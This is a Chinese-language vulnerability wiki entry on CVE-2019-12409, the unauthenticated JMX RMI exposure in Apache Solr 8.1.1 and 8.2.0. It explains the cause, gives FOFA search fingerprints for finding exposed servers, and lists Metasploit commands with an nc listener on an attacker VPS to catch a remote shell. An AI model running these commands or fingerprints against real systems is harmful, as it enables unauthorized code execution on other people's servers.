

# CVE-2019-12409 | Apache Solr == 8.1.1 / 8.2.0 存在RMI注入漏洞





## 0x00 漏洞说明



Apache Solr 的 8.1.1 和 8.2.0 版本在 Solr 附带的默认 solr.in.sh 配置文件中包含 ENABLE_REMOTE_JMX_OPTS 配置选项的不安全设置。并且启用 JMX 监听在 RMI_PORT（默认值=18983端口）上公开，**无需任何身份验证**便可访问。并允许攻击者在 Solr 服务器**上传并执行恶意代码**



## 0x01 影响版本



- == Apache Solr  8.1.1

- == Apache Solr  8.2.0



## 0x02 漏洞成因



1. 默认的配置文件solr.in.sh的选项**ENABLE_REMOTE_JMX_OPTS**字段值被设置为”true”，这会启用JMX监听服务并会在**公网**中监听一个**18983**的RMI端口，无需任何认证，也就是说在未授权的情况下，攻击者结合使用JMX RMI就会造成远程代码攻击。

2. 当攻击者在目标18983 RMI监听端口(默认)，利用 **javax.management.loading.MLet**的**getMBeansFromURL** 方法来加载一个远端恶意的 MBean，将会导致RCE。

   



## 0x03 漏洞指纹



fofa:

```
app="apache-solr"
title="Solr Admin"
```





## 0x04 POC & EXP




!FILENAME MSF
```bash
#需要有公网IP
use exploit/multi/misc/java_jmx_server
show options
set RHOSTS <ip>
set RPORT <port>
run

#如果监听主机不在MSF当前主机上，则:
set LHOST <VPS IP>
set LPORT <port>

#在目标VPS
nc -lvvp <port>
```





## 0x05 扩展链接



[CVE-2019-12409：由于错误的默认配置导致的 Apache Solr RCE 漏洞](https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2019-12409-RCE%20Vulnerability%20Due%20to%20Bad%20Defalut%20Config-Apache%20Solr)



## 0x06 联系方式



作者 : BitWiki支持团队
